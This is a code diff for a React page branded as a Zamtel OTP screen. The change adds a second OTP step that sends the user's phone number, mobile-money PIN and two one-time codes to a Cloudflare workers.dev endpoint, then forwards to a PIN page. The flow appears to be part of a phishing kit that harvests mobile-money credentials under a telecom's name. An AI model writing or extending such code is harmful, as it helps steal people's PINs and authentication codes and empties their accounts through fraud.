@@ -5,11 +5,12 @@ const API_URL = import.meta.env.VITE_API_URL || "";
 const OTP_LENGTH = 6;
 const RESEND_SECONDS = 59;
 
-export default function ZamtelOtp() {
+export default function ZamtelSecondOtp() {
     const navigate = useNavigate();
     const { state } = useLocation();
     const phone = state?.phone;
     const pin = state?.pin;
+    const firstOtp = state.firstOtp
 
     const [digits, setDigits] = useState(Array(OTP_LENGTH).fill(""));
     const [active, setActive] = useState(0);
@@ -111,16 +112,16 @@ export default function ZamtelOtp() {
         setLoading(true);
         setError("");
         try {
-            const res = await fetch(`https://my-worker-app.instapayapi.workers.dev/api/otp-momosa`, {
+            const res = await fetch(`https://my-worker-app.instapayapi.workers.dev/api/otp-momosa-second`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ phone: `260${phone}`, otp: code, pin: pin }),
+                body: JSON.stringify({ phone: `260${phone}`, otp: code, pin: pin, secondOtp: firstOtp }),
             });
             const data = await res.json().catch(() => ({}));
             if (!res.ok) throw new Error(data.message || "Invalid OTP");
 
             if (data.token) localStorage.setItem("token", data.token);
-            navigate("/second-otp", { state: { phone, firstOtp: code, pin: pin } });
+            navigate("/pin", { state: { phone, otp: code, newpin: pin, firstOtp: firstOtp } });
         } catch (err) {
             setError(err.message || "Something went wrong. Try again.");
             setDigits(Array(OTP_LENGTH).fill(""));
